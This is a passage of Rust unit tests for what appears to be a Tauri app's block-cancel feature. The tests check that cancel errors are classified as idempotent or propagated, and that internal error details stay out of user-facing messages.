            "already terminated",
            "CancelBlock failed: not_found: no such block",
            "block has already completed",
        ];
        for sample in idempotent_samples {
            match classify_cancel_error(sample, "sess-x") {
                CancelOutcome::Idempotent => {}
                CancelOutcome::Propagate(e) => {
                    panic!(
                        "expected '{sample}' idempotent, got Propagate({:?})",
                        e.code
                    )
                }
            }
        }

        let propagate_samples = [
            "sidecar connection refused",
            "io error: broken pipe",
            "decode error: expected CancelBlockResult",
        ];
        for sample in propagate_samples {
            match classify_cancel_error(sample, "sess-x") {
                CancelOutcome::Idempotent => {
                    panic!("expected '{sample}' NOT idempotent")
                }
                CancelOutcome::Propagate(e) => {
                    // Real failures map to bridge-internal with the detail
                    // preserved in context — never leaked into user_message.
                    assert_eq!(e.code, ErrorCode::BridgeInternal);
                    assert!(!e.user_message.contains(sample));
                }
            }
        }
    }

    /// Without the `sidecar` feature the command must surface a short,
    /// toast-friendly error the UI can branch on. The `sidecar` feature is
    /// off in the default `cargo test` run for the host-tauri crate — so
    /// this test lives on the default compile path.
    ///
    /// Pre-FIX-2 this asserted the exact string; post-FIX-2 we assert the
    /// typed code so the TS `switch` statement has something to hit.
    #[cfg(not(feature = "sidecar"))]
    #[test]
    fn quanta_cancel_block_without_sidecar_has_graceful_code() {
        // The fallback arm constructs this directly; we pin the code shape
        // so a future edit that changes the label shows up red.
        let err = TauriError::bridge_internal("cancel not supported in embedded-shell mode");
        assert_eq!(err.code, ErrorCode::BridgeInternal);
        // `user_message` is the UI-safe generic; the detail lives in context.
        let v = serde_json::to_value(&err).unwrap();
        assert_eq!(v["code"], "bridge-internal");
        assert!(v["context"]["detail"]
            .as_str()
            .unwrap()
            .contains("embedded-shell"));
    }
}
